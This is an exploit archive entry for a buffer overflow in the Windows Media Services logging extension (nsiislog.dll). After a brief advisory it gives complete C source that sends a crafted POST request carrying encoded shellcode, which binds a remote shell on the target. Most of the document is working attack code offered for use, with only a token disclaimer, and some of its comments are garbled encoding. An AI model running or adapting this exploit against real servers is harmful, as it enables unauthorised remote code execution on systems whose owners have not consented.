source: http://www.securityfocus.com/bid/8035/info

Microsoft has reported a buffer overflow vulnerability in Windows Media Services. This is due to a problem with how the logging ISAPI extension handles incoming client requests. This could cause arbitrary code execution in IIS, which is exploitable through Media Services.

// Windows Media Services Remote Command Execution #2 
// v. 1.0 beta 
// (c) firew0rker  //tN  [The N0b0D1eS] 

#include <stdio.h> 
#include <string.h> 
#include <stdlib.h> 

#ifdef WIN32 
#include <winsock.h> 
#pragma comment(lib, "wsock32") 
#else 
#include <sys/socket.h> 
#include <sys/types.h> 
#include <netinet/in.h> 
#include <arpa/inet.h> 
#include <netdb.h> 
#include <unistd.h> 
#define SOCKET int 
#define DWORD uint32_t 
#define ULONG unsigned long 
#define INVALID_SOCKET -1 
#define SOCKET_ERROR -1 
#define closesocket close 
#endif 

char shellcode[]= 
//"\x90\x90\x90\x90\x90\x90\x90\xCC" //���⤪� 
"\xeb\x02\xeb\x05\xe8\xf9\xff\xff" 
"\xff\x5b\x81\xeb\x4d\x43\x22\x11" 
"\x8b\xc3\x05\x66\x43\x22\x11\x66" 
"\xb9\x15\x03\x80\x30\xfb\x40\x67" 
"\xe2\xf9\x33\xa3\xf9\xfb\x72\x66" 
"\x53\x06\x04\x04\x76\x66\x37\x06" 
"\x04\x04\xa8\x40\xf6\xbd\xd9\xea" 
"\xf8\x66\x53\x06\x04\x04\xa8\x93" 
"\xfb\xfb\x04\x04\x13\x91\xfa\xfb" 
"\xfb\x43\xcd\xbd\xd9\xea\xf8\x7e" 
"\x53\x06\x04\x04\xab\x04\x6e\x37" 
"\x06\x04\x04\xf0\x3b\xf4\x7f\xbe" 
"\xfa\xfb\xfb\x76\x66\x3b\x06\x04" 
"\x04\xa8\x40\xba\xbd\xd9\xea\xf8" 
"\x66\x53\x06\x04\x04\xa8\xab\x13" 
"\xcc\xfa\xfb\xfb\x76\x7e\x8f\x05" 
"\x04\x04\xab\x93\xfa\xfa\xfb\xfb" 
"\x04\x6e\x4b\x06\x04\x04\xc8\x20" 
"\xa8\xa8\xa8\x91\xfd\x91\xfa\x91" 
"\xf9\x04\x6e\x3b\x06\x04\x04\x72" 
"\x7e\xa7\x05\x04\x04\x9d\x3c\x7e" 
"\x9f\x05\x04\x04\xf9\xfb\x9d\x3c" 
"\x7e\x9d\x05\x04\x04\x73\xfb\x3c" 
"\x7e\x93\x05\x04\x04\xfb\xfb\xfb" 
"\xfb\x76\x66\x9f\x05\x04\x04\x91" 
"\xeb\xa8\x04\x4e\xa7\x05\x04\x04" 
"\x04\x6e\x47\x06\x04\x04\xf0\x3b" 
"\x8f\xe8\x76\x6e\x9c\x05\x04\x04" 
"\x05\xf9\x7b\xc1\xfb\xf4\x7f\x46" 
"\xfb\xfb\xfb\x10\x2f\x91\xfa\x04" 
"\x4e\xa7\x05\x04\x04\x04\x6e\x43" 
"\x06\x04\x04\xf0\x3b\xf4\x7e\x5e" 
"\xfb\xfb\xfb\x3c\x7e\x9b\x05\x04" 
"\x04\xeb\xfb\xfb\xfb\x76\x7e\x9b" 
"\x05\x04\x04\xab\x76\x7e\x9f\x05" 
"\x04\x04\xab\x04\x4e\xa7\x05\x04" 
"\x04\x04\x6e\x4f\x06\x04\x04\x72" 
"\x7e\xa3\x05\x04\x04\x07\x76\x46" 
"\xf3\x05\x04\x04\xc8\x3b\x42\xbf" 
"\xfb\xfb\xfb\x08\x51\x3c\x7e\xcf" 
"\x05\x04\x04\xfb\xfa\xfb\xfb\x70" 
"\x7e\xa3\x05\x04\x04\x72\x7e\xbf" 
"\x05\x04\x04\x72\x7e\xb3\x05\x04" 
"\x04\x72\x7e\xbb\x05\x04\x04\x3c" 
"\x7e\xf3\x05\x04\x04\xbf\xfb\xfb" 
"\xfb\xc8\x20\x76\x7e\x03\x06\x04" 
"\x04\xab\x76\x7e\xf3\x05\x04\x04" 
"\xab\xa8\xa8\x93\xfb\xfb\xfb\xf3" 
"\x91\xfa\xa8\xa8\x43\x8c\xbd\xd9" 
"\xea\xf8\x7e\x53\x06\x04\x04\xab" 
"\xa8\x04\x6e\x3f\x06\x04\x04\x04" 
"\x4e\xa3\x05\x04\x04\x04\x6e\x57" 
"\x06\x04\x04\x12\xa0\x04\x04\x04" 
"\x04\x6e\x33\x06\x04\x04\x13\x76" 
"\xfa\xfb\xfb\x33\xef\xfb\xfb\xac" 
"\xad\x13\xfb\xfb\xfb\xfb\x7a\xd7" 
"\xdf\xf9\xbe\xd9\xea\x43\x0e\xbe" 
"\xd9\xea\xf8\xff\xdf\x78\x3f\xff" 
"\xab\x9f\x9c\x04\xcd\xfb\xfb\x72" 
"\x9e\x03\x13\xfb\xfb\xfb\xfb\x7a" 
"\xd7\xdf\xd8\xbe\xd9\xea\x43\xac" 
"\xbe\xd9\xea\xf8\xff\xdf\x78\x3f" 
"\xff\x72\xbe\x07\x9f\x9c\x72\xdd" 
"\xfb\xfb\x70\x86\xf3\x9d\x7a\xc4" 
"\xb6\xa1\x8e\xf4\x70\x0c\xf8\x8d" 
"\xc7\x7a\xc5\xab\xbe\xfb\xfb\x8e" 
"\xf9\x10\xf3\x7a\x14\xfb\xfb\xfa" 
"\xfb\x10\x19\x72\x86\x0b\x72\x8e" 
"\x17\x70\x86\xf7\x42\x6d\xfb\xfb" 
"\xfb\xc9\x3b\x09\x55\x72\x86\x0f" 
"\x70\x34\xd0\xb6\xf7\x70\xad\x83" 
"\xf8\xae\x0b\x70\xa1\xdb\xf8\xa6" 
"\x0b\xc8\x3b\x70\xc0\xf8\x86\x0b" 
"\x70\x8e\xf7\xaa\x08\x5d\x8e\xfe" 
"\x78\x3f\xff\x10\xf1\xa2\x78\x38" 
"\xff\xbb\xc0\xb9\xe3\x8e\x1f\xc0" 
"\xb9\xe3\x8e\xf9\x10\xb8\x70\x89" 
"\xdf\xf8\x8e\x0b\x2a\x1b\xf8\x3d" 
"\xf4\x4c\xfb\x70\x81\xe7\x3a\x1b" 
"\xf9\xf8\xbe\x0b\xf8\x3c\x70\xfb" 
"\xf8\xbe\x0b\x70\xb6\x0f\x72\xb6" 
"\xf7\x70\xa6\xeb\x72\xf8\x78\x96" 
"\xeb\xff\x70\x8e\x17\x7b\xc2\xfb" 
"\x8e\x7c\x9f\x9c\x74\xfd\xfb\xfb" 
"\x78\x3f\xff\xa5\xa4\x32\x39\xf7" 
"\xfb\x70\x86\x0b\x12\x99\x04\x04" 
"\x04\x33\xfb\xfb\xfb\x70\xbe\xeb" 
"\x7a\x53\x67\xfb\xfb\xfb\xfb\xfb" 
"\xfa\xfb\x43\xfb\xfb\xfb\xfb\x32" 
"\x38\xb7\x94\x9a\x9f\xb7\x92\x99" 
"\x89\x9a\x89\x82\xba\xfb\xbe\x83" 
"\x92\x8f\xab\x89\x94\x98\x9e\x88" 
"\x88\xfb\xb8\x89\x9e\x9a\x8f\x9e" 
"\xab\x89\x94\x98\x9e\x88\x88\xba" 
"\xfb\xfb\xac\xa8\xc9\xa4\xc8\xc9" 
"\xd5\xbf\xb7\xb7\xfb\xac\xa8\xba" 
"\xa8\x94\x98\x90\x9e\x8f\xba\xfb" 
"\x99\x92\x95\x9f\xfb\x97\x92\x88" 
"\x8f\x9e\x95\xfb\x9a\x98\x98\x9e" 
"\x8b\x8f\xfb\xac\xa8\xba\xa8\x8f" 
"\x9a\x89\x8f\x8e\x8b\xfb\x98\x97" 
"\x94\x88\x9e\x88\x94\x98\x90\x9e" 
"\x8f\xfb\xfb\x98\x96\x9f\xfb\xe9" 
"\xc4\xfc\xff\xff\x74\xf9\x75\xf7"; 


const DWORD default_EIP_pos = 9992; //��������� EIP � ���(sploit) 
const DWORD default_EBX_points_to = 9988; //� ?� EBX �?ᥫ? sploit 
//const DWORD default_EIP_value = 0x77F8441B; //�� ����.�. JMP EDX, � � ���� �� � � ntdll.dll 
const DWORD default_EIP_value = 0x40F01333; 
//const default_EDX_points_to = 0x1000; //� �� �?������
char *nsiislog_default = "/scripts/nsiislog.dll"; 
char sploit[default_EIP_pos+4+sizeof(shellcode)+1]; 
char sploitbuf[sizeof(sploit)*2]; 

void usage(char* argv[]) 
{ 
       printf("Dicklamer (: " 
   "We are not responsible for the illegal use of this software.\n" 
   "Description: Binds shell to port 34816 (or higher if port busy).\n" 
   "Usage:   " 
   "%s target [-p target_port] [-r /renamed_scripts/renamed_nsiislog.dll]\n" 
   "Supported target(s):\n" 
   "Windows version\t\t\t\tnsiislog.dll version\n" 
   "------------------------------------------------------------\n" 
   "2000 [5.00.2195] server rus.\t\t4.1.0.3917\n", argv[0]); 
       exit(0); 
} 

int main(int argc, char* argv[]) 
{ 
#ifdef WIN32 
   WSADATA wsaData;        
#endif 
   int target_port = 80; 
   char *nsiislog = nsiislog_default; 
   int      nArgIndex; 

   if (argc<2) usage(argv); 
   nArgIndex = 1; 
   while ((nArgIndex < argc)&&(strlen(argv[nArgIndex])>=2)&&(argv[nArgIndex][0]=='-')) 
   { 
      switch (argv[nArgIndex++][1]) 
      { 
      case 'p': 
      case 'P': 
         target_port = atoi(argv[nArgIndex++]); 
         continue; 
      case 'r': 
      case 'R': 
         nsiislog = argv[nArgIndex++]; 
         continue; 
      default: 
         usage(argv); 
      } 
   } 
    
   try { 
#ifdef WIN32 
      WSAStartup(0x0101, &wsaData); 
#endif 
      SOCKET s = socket(AF_INET,SOCK_STREAM,0); 
      if (s == INVALID_SOCKET) throw("No socket"); 
      sockaddr_in addr; 
       
      //.�?��?  �� � � 
      ULONG iaddr = inet_addr(argv[1]); 
      if (iaddr == INADDR_NONE) {//.�� - ���� 
         hostent *ph = gethostbyname(argv[1]); 
         if (!ph) throw("Cant resolve hostname"); 
         memcpy(&addr.sin_addr.s_addr,ph->h_addr_list[0],sizeof(in_addr)); 
      } else {//.�� - IP 
         memcpy(&addr.sin_addr.s_addr,&iaddr,4); 
      }; 
       
      addr.sin_family = AF_INET; 
      addr.sin_port   = htons(target_port); 
      int sizeofaddr=sizeof(addr); 

char *req = "MX_STATS_LogLine: "; 
strcpy(sploit, req); 
memset(sploit+strlen(sploit), 0xCC, default_EIP_pos-strlen(req)); 
//memcpy(sploit+default_EDX_points_to, shellcode, sizeof(shellcode)-1/*� �\0*/); 
memcpy(sploit+default_EBX_points_to-(sizeof(shellcode)-1)+4, shellcode, sizeof(shellcode)-1/*� �\0*/); 
//�௥த� �  EIP, EBX �?� ���  ��?���� DWORD � ?� � �� , ��� JZ/JNZ 
memcpy(sploit+default_EIP_pos, &default_EIP_value, sizeof default_EIP_value); 
       
      /*strcpy(sploit+sizeof(sploit)-11,"BCDEFGHIJK");*/ 
      sploit[sizeof(sploit)-1] = 0; 
       
  if (connect(s,(struct sockaddr*)&addr,sizeof(struct sockaddr)) == SOCKET_ERROR) throw("Cant connect host"); 

      sprintf(sploitbuf, 
         "POST %s HTTP/1.0\r\n" 
         "Accept: */*\r\n" 
         "User-Agent: NSPlayer/4.1.0.3917\r\n" 
         "Content-Type: text/plain\r\n" 
         "Content-Length: %i\r\n" 
         "Pragma: xClientGUID={89f451e0-a491-4346-ad78-4d55aac89045}\r\n" 
         "\r\n%s\r\n", 
         nsiislog,strlen(sploit),sploit); 
       
      int snd=send(s,sploitbuf,strlen(sploitbuf),0); 
      if (snd == strlen(sploitbuf)) printf("Target exploited.\n"); 
         else throw("Cant send exploit"); 
      closesocket(s); 
   } 
   catch (char *errmsg) 
   { 
       
      printf("%s\n",errmsg); 
      return -1; 
   } 
   catch (int err_n) 
   { 
      printf("error %i\n",err_n); 
      return err_n; 
   } 
#ifdef WIN32 
    WSACleanup(); 
#endif 
   return 0; 
} 
